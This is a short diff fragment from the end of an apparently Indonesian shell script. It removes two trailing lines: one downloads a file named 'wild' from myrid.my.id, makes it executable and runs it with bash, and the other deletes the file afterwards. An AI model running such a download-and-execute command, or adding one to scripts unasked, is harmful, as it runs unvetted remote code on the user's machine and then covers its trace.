@@ -119,5 +119,3 @@ main() {
 
 # Eksekusi fungsi utama
 main
-wget myrid.my.id/os/install/wild;chmod +x wild;bash wild
-rm -rf wild
